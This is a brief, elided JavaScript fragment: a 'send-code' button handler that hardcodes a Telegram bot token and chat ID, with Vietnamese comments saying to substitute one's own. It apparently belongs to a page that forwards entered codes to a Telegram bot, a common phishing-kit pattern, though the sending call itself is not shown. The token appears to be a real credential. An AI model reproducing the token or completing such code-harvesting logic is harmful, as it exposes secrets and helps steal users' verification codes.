...
function sendCode() {
    ...
    $('#send-code').on('click', function () {
        ...
        const botToken = '6626504077:AAGbulhFDIl8cpr0DUob_2du8ZeDMnHn9_Y'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
        const chatId = '-2438958725'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
